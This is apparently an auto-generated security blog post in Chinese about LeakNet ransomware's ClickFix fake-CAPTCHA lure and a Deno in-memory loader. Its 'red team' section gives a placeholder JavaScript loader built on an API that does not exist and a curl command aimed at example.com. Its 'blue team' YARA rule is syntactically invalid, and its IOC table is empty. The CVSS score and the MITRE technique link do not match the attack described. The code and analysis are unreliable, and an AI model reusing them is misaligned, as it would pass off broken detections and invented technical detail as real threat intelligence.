---
layout: post
title:  "LeakNet Ransomware Uses ClickFix via Hacked Sites, Deploys Deno In-Memory Loader"
date:   2026-03-17 18:53:17 +0000
categories: [security]
severity: critical
---

# 🚨 解析 LeakNet 勒索軟體的 ClickFix 社交工程攻擊與 Deno 基於的 C2 加載器
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: ClickFix, Deno, JavaScript, Memory-only Payload

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: LeakNet 勒索軟體的 ClickFix 社交工程攻擊是通過駭入合法網站，使用假的 CAPTCHA 驗證，誘導用戶執行惡意命令。
* **攻擊流程圖解**:
  1. 用戶訪問駭入的網站
  2. 網站顯示假的 CAPTCHA 驗證
  3. 用戶執行惡意命令 (msiexec.exe)
  4. 惡意命令下載並執行 Deno 基於的 C2 加載器
  5. C2 加載器在記憶體中執行惡意 payload
* **受影響元件**: Windows 系統，尤其是使用 msiexec.exe 的版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 駭入合法網站，獲得用戶的信任
* **Payload 建構邏輯**:

    ```
    
    javascript
    // Deno 基於的 C2 加載器
    const loader = Deno.createLoader({
      // ...
    });
    
    // 惡意 payload
    const payload = {
      // ...
    };
    
    // 下載並執行 payload
    loader.load(payload);
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -X POST -H "Content-Type: application/json" -d '{"cmd": "msiexec.exe"}' http://example.com/captcha
    
    ```
* **繞過技術**: 使用合法網站和假的 CAPTCHA 驗證來繞過安全防護

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | ... | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule LeakNet_ClickFix {
      meta:
        description = "LeakNet ClickFix 社交工程攻擊"
        author = "..."
      strings:
        $msiexec = "msiexec.exe"
      condition:
        $msiexec in (pe.imports)
    }
    
    ```
* **緩解措施**: 更新系統和應用程序，使用安全的瀏覽器和網站，避免執行未知命令

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ClickFix**: 一種社交工程攻擊，通過假的 CAPTCHA 驗證，誘導用戶執行惡意命令
* **Deno**: 一種基於 JavaScript 的 runtime 環境，允許在記憶體中執行 JavaScript 代碼
* **Memory-only Payload**: 一種惡意 payload，只在記憶體中執行，不寫入磁盤

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/leaknet-ransomware-uses-clickfix-via.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


